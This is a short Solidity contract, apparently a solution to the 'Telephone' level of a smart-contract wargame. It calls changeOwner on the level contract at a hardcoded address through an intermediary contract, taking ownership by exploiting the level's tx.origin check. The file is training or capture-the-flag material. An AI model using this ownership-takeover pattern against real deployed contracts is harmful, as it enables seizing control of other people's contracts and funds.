// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level04.sol";

contract TelephoneCall 
{
    Telephone telephone1 = Telephone(0x7cB6b7f0B295528A7C9eED75c4BD6eEA3fa79e47);

    function ChangeOwner() public {
        telephone1.changeOwner(0xa55B5589e71424F31e0A00e790359D40E324f016);
    }
}